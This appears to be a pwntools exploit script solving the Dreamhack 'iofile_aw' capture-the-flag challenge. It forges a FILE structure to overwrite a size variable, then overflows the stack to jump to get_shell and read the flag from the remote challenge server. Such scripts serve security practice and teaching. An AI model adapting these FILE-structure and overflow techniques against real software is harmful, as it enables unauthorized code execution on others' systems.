from pwn import *
context.update(log_level = 'debug')
elf = ELF('iofile_aw')
addr_size = elf.symbols['size']
p = remote('host1.dreamhack.games', 21414)
#p = process('iofile_aw')
payload = p64(0xfbad2088)
payload += p64(0)*6
payload += p64(addr_size) #buf_base
p.sendlineafter('# ', 'printf ' + payload)
#raw_input('debug: ' + str(p.pid))
p.sendlineafter('# ', 'read')
p.sendline(p64(0x500))
addr_shell = elf.symbols['get_shell']
payload = 'a'*0x228 + p64(addr_shell)
p.sendlineafter('# ', payload)
p.sendlineafter('# ', 'exit')
p.sendline('cat flag')
p.interactive()

